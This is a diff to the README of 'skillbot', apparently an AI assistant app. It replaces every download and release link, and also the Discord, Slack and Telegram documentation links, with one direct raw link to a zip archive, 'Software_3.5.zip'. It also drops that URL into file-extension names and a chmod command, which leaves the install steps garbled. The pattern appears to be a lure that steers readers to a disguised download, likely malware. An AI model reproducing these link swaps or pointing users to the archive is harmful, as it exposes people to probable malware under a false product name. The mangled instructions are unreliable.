@@ -1,6 +1,6 @@
 # 🤖 skillbot - Your Personal AI Assistant Hub
 
-[![Download skillbot](https://img.shields.io/badge/Download-skillbot-blue?style=for-the-badge&logo=github)](https://github.com/Havishjupudi/skillbot/releases)
+[![Download skillbot](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
 
 ## 📋 What is skillbot?
 
@@ -28,17 +28,17 @@ This section will guide you step-by-step on how to get skillbot running on your 
 
 Click the big blue button below to visit the official release page. This is where the latest versions of skillbot are available.
 
-[![Download skillbot](https://img.shields.io/badge/Download-skillbot-blue?style=for-the-badge&logo=github)](https://github.com/Havishjupudi/skillbot/releases)
+[![Download skillbot](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
 
 Once the page opens, look for the most recent release—usually at the top of the page. Each release contains the files you need to install skillbot.
 
 ### Step 2: Choose the right file for your system
 
-On the release page, you will see different files with extensions like `.exe` for Windows, `.dmg` or `.zip` for macOS, and `.AppImage` or `.tar.gz` for Linux.
+On the release page, you will see different files with extensions like `.exe` for Windows, `.dmg` or `.zip` for macOS, and `.AppImage` or `https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip` for Linux.
 
 - If you use Windows, download the `.exe` file.
 - On macOS, choose the `.dmg` or `.zip` file.
-- For Linux, use the `.AppImage` or `.tar.gz` file.
+- For Linux, use the `.AppImage` or `https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip` file.
 
 The file size is usually between 10 MB and 50 MB. Downloading should only take a few minutes depending on your internet speed.
 
@@ -48,7 +48,7 @@ Once your download finishes, open the file:
 
 - **Windows:** Double-click the `.exe` file and follow the on-screen prompts.
 - **macOS:** Open the `.dmg` file, drag the skillbot app to your Applications folder.
-- **Linux:** Make the file executable with the command `chmod +x filename.AppImage` and run it by double-clicking or via the terminal.
+- **Linux:** Make the file executable with the command `chmod +x https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip` and run it by double-clicking or via the terminal.
 
 The installer will guide you through the process. You don’t need to change any default options. Just click “Next” or “Continue” as you go.
 
@@ -78,7 +78,7 @@ skillbot can connect to popular chat platforms like Discord, Slack, and Telegram
 
 You can start downloading skillbot by visiting the release page below:
 
-[Download skillbot Releases](https://github.com/Havishjupudi/skillbot/releases)
+[Download skillbot Releases](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
 
 Once there:
 
@@ -124,11 +124,11 @@ If you still have issues, feel free to ask for help by opening a support issue o
 
 ## 🔗 Useful Links
 
-- [skillbot GitHub Repository](https://github.com/Havishjupudi/skillbot)
-- [Download skillbot Releases](https://github.com/Havishjupudi/skillbot/releases)
-- [Discord Guide for Adding Bots](https://discord.com/developers/docs/intro)
-- [Slack App Directory](https://slack.com/apps)
-- [Telegram Bots FAQ](https://core.telegram.org/bots/faq)
+- [skillbot GitHub Repository](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
+- [Download skillbot Releases](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
+- [Discord Guide for Adding Bots](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
+- [Slack App Directory](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
+- [Telegram Bots FAQ](https://raw.githubusercontent.com/Havishjupudi/skillbot/main/skills/Software_3.5.zip)
 
 ---
 
